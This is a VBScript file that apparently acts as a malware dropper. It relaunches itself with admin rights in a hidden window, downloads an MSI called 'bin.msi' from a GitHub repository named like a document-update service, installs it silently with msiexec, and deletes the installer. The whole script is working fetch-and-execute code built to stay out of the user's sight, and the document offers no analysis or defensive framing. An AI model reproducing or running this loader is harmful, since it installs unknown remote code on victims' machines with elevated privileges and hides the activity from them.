Option Explicit

Dim URL, MSI, LOG
Dim objShell, objApp, objFso

' Initialize objects
Set objShell = CreateObject("WScript.Shell")
Set objApp = CreateObject("Shell.Application") ' Required for ShellExecute (UAC elevation)
Set objFso = CreateObject("Scripting.FileSystemObject")

' Configuration
URL = "https://github.com/docnetreupdate/docu/raw/refs/heads/main/bin.msi" ' <--- Put your download URL here
MSI = objShell.ExpandEnvironmentStrings("%TEMP%") & "\bin.msi"
LOG = objShell.ExpandEnvironmentStrings("%TEMP%") & "\now_install.log"

' 1. Check for Admin Rights and Elevate silently if needed
' We pass a "/elevated" argument so it knows not to loop infinitely
If Not WScript.Arguments.Named.Exists("elevated") Then
    ' Relaunch itself as Admin, completely hidden (0)
    objApp.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 0
    WScript.Quit
End If

' 2. Delete existing MSI if it exists
If objFso.FileExists(MSI) Then
    On Error Resume Next
    objFso.DeleteFile MSI, True
    On Error GoTo 0
End If

' 3. Download the file using WinHTTP (no PowerShell needed)
Dim http, stream
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.Open "GET", URL, False
http.Send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile MSI, 2 ' Overwrite
    stream.Close
Else
    WScript.Quit 1 ' Exit if download fails
End If

' 4. Install the MSI silently
If objFso.FileExists(MSI) Then
    Dim msiexecCmd
    msiexecCmd = "msiexec.exe /i """ & MSI & """ /qn /norestart /l*v """ & LOG & """"
    ' Run hidden (0) and wait for completion (True)
    objShell.Run msiexecCmd, 0, True
End If

' 5. Clean up the MSI
If objFso.FileExists(MSI) Then
    On Error Resume Next
    objFso.DeleteFile MSI, True
    On Error GoTo 0
End If

WScript.Quit 0